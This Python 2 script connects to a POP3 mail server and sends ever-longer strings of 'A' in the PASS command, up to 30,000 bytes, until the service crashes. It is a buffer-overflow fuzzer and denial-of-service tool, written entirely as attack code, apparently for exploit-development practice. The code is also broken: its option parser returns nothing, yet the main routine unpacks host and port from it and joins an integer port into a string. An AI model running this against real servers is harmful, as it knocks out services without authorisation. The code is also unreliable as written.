import socket as s
import time
import sys
import re

host = "192.168.0.90"
port = 110
verbose = 0


usage = """
Usage: python check-crash [OPTIONS]\n
Available options:
    -h  --host       ip address
    -p  --port       host port
    -v  --verbose    print extra data in screen
\n
"""


def ip_address_format_is_valid(ip_address):
    pattern = "([0-9]{1,3}\.){3}([0-9]{1,3})"
    if re.search(pattern, ip_address) == None:
        return 0
    return 1

# TODO:
# Finish get_options function
# Strip args in host and port
def get_options():
    host = ""
    port = 0

    # Used to determine if option is supposed to be [-p] or [110]
    # Status table:
    # Status 0 - Checking option
    # Status 1 - Detected -h as option and looking for host string
    # Status 2 - Detected -p as option and looking for port
    status = 0
    for option in sys.argv[1:]:
        if status == 0:
            if option == "-h":
                status = 1
            elif option == "-p":
                status = 2
            elif option == "-v":
                global verbose
                verbose = 1
            else:
                print "Invalid OPTIONS format"
                print usage
                exit()

        if status == 1:
            if ip_address_format_is_valid(option):
                host = option
                status = 0
            else:
                print "Invalid OPTIONS format"
                print "Invalid host address"
                print usage
                exit()

        if status == 2:
            try:
                port = int(option)
                if not (0 < port and port < 2**16):
                    print "Invalid OPTIONS format"
                    print "Invalid port"
                    print usage
                    exit()
                status = 0
            except:
                print "Invalid OPTIONS format"
                print usage
                exit()

def connection_ok(host, port):
    sock = s.socket(s.AF_INET, s.SOCK_STREAM)

    sock.connect((host, port))

    response = sock.recv(1024)

    if "error" in response:
        return 0

    sock.close()
    
    return 1



def prepare_strings():
    strings = []
    for counter in range(30):
        strings.append("A" * 1000 * (counter+1))

    return strings


def crash(strings):
    for buf in strings:
        sock = s.socket(s.AF_INET, s.SOCK_STREAM)
        sock.connect((host, port))
        print "Sending %d bytes..." %len(buf)
        sock.recv(1024)
        sock.send("USER ano\r\n")
        sock.recv(1024)
        try:
            sock.send("PASS " + buf + "\r\n")
            time.sleep(0.5)
            response = sock.recv(1024)
            print response
            sock.close()
        except Exception:
            print "Crashed successfully with %d bytes" %len(buf)
            break
        time.sleep(0.5)


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print "Missing arguments..."
        print usage
        exit()
    
    host, port = get_options()
    
    print "Attempting connection on host " + host + " at port " + port 
    if not connection_ok(host, port):
        print "Connection error"
        print "Exiting..."
        exit()

    strings = prepare_strings()

    crash(strings)

